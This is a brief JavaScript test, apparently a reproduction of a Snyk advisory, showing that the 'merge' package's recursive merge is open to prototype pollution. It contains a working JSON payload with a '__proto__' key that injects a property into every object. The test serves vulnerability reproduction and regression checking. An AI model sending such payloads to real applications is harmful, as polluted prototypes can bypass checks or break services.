//https://snyk.io/vuln/SNYK-JS-MERGE-1042987

test("prototype pollution in merge", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require("merge");
  const payload2 = JSON.parse('{"x": {"__proto__":{"polluted":"yes"}}}');
  let obj1 = { x: { y: 1 } };
  merge.recursive(obj1, payload2);

  expect({}.polluted).toBe("yes");
});
